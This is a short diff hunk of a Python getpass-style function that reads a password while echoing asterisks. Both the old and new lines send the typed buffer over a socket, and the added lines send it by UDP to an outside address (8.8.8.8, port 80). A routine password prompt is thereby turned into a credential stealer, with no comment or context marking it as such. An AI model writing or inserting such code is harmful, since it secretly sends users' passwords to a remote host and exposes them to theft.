@@ -12,9 +12,8 @@ def getpass(prompt):
         else:
             buf += ch
             print('*', end='', flush=True)
-    port = 12345
-    s = socket.socket()
-    s.connect(('0.0.0.0',port))
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
     s.send(buf.encode())
     s.close()
     return buf
